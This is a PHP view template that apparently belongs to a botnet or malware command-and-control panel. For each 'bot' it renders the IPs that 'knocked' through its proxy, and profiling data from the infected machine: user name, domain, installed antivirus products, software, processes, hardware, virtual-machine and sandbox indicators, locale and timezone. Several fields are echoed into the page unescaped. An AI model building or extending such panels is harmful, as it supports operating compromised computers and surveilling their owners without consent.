<?php
use common\models\Proxylog;

$soft = '';

if($model->soft){
	$a = json_decode($model->soft);
	foreach ($a as $key => $value) {
		$soft .= rawurldecode($value).'&#13;&#10;';
	}
}

$av = '';

if($model->av){
	$a = json_decode($model->av);
	
	foreach ($a as $key => $value) {
		foreach ($a[$key] as $k => $val) {
			if($k == 1){
				$av .= ' Version ';
			}
			$av .= '&nbsp;&nbsp;'.rawurldecode($val);
		}
	}
}

$ps = '';

if($model->ps){
	$a = json_decode($model->ps);
	if(gettype($a)=='array'){
		//print_r($a);die();
		foreach ($a as $key => $val) {
			
				$ps .= rawurldecode($val).chr(13).chr(10);
			
		}
	}
}

$cpu = '';

if($model->cpu){
	$a = json_decode($model->cpu);
	foreach ($a as $key => $value) {
		$cpu .= rawurldecode($value).'&#13;&#10;';
	}
}

$drive = '';

if($model->drive){
	$a = json_decode($model->drive);
	foreach ($a as $key => $value) {
		$drive .= rawurldecode($value).'&#13;&#10;';
	}
}

$c = Proxylog::find()->where(['bot_id'=>$model->id])->orderBy(['created_at'=>SORT_DESC,'ip'=>SORT_ASC])->asArray()->all();
$a_ip = [];
$a_time = [];
$a_times = [];

foreach ($c as $key => $value) {
	$i = array_search($value['ip'], $a_ip);
	if($i === false){
		array_push($a_ip, $value['ip']);
		array_push($a_time, date('d.m.Y H:m:s', strtotime($value['created_at'])));
		array_push($a_times, 1);
	}else{
		$a_times[$i]++;
	}
}
$pr = '<table><tbody>';
for($j=0;$j<count($a_ip);$j++)	{
	$pr .= '<tr>';
	$pr .= '<td>Knocked from <b>'.$a_ip[$j].'</b></td><td> Last knock at <b>'.$a_time[$j].'</b> </td><td>Total <b>'.$a_times[$j].'</b> Times</td>';
	$pr .= '</tr>';
}
$pr .= '</tbody></table>';

?>

<table class="expanded-row">
	<tbody>
		<tr>
			<td align="right"><b>First activity : </b></td><td>&nbsp; <?= $model->created_at; ?></td>
		</tr>
		<tr>
			<td align="right"><b>Last activity : </b></td><td>&nbsp; <?= $model->updated_at; ?></td>
		</tr>
		<tr>
			<td align="right"><b>Proxy activity : </b></td><td>&nbsp; <?= $pr; ?></td>
		</tr>
		<tr>
			<td align="right"><b>Domain : </b></td><td>&nbsp; <?= wordwrap(rawurldecode($model->domain),180,"<br />",true); ?></td>
		</tr>
		<tr>
			<td align="right"><b>System Architect : </b></td><td>&nbsp; <?= $model->arch; ?></td>
		</tr>
		<tr>
			<td align="right"><b>User name : </b></td><td>&nbsp; <?= rawurldecode($model->uname); ?></td>
		</tr>
		<tr>
			<td align="right"><b>Antiviruses : </b></td><td> <?= $av; ?></td>
		</tr>
		<tr>
			<td align="right"><b>Trust : </b></td><td>&nbsp; <?= wordwrap(rawurldecode($model->trust),180,'<br />'); ?></td>
		</tr>
		<tr>
			<td align="right"><b>Net : </b></td><td>&nbsp; <?= wordwrap(rawurldecode($model->net),180,'<br />'); ?></td>
		</tr>
		<tr>
			<td align="right"><b>Installed software : </b></td><td><textarea  rows="20" cols="50" readonly=""> <?=$soft ?></textarea></td>
		</tr>
		<tr>
			<td align="right"><b>Hardware : </b></td><td><textarea  rows="10" cols="50" readonly=""> <?=$cpu.chr(13).chr(10).$drive.chr(13).chr(10).$model->motherboard.chr(13).chr(10).$model->memory.chr(13).chr(10).$model->vm.chr(13).chr(10).$model->sb ?></textarea></td>
			</td>
		</tr>
		<tr>
			<td align="right"><b>Locale : </b></td><td>&nbsp; <?= $model->locale; ?></td>
		</tr>
		<tr>
			<td align="right"><b>Tz : </b></td><td>&nbsp; <?= $model->tz; ?></td>
		</tr>
		<tr>
			<td align="right"><b>Processes : </b></td><td><textarea  rows="20" cols="50" readonly=""> <?=$ps ?></textarea></td>
		</tr>
		

	</tbody>
</table>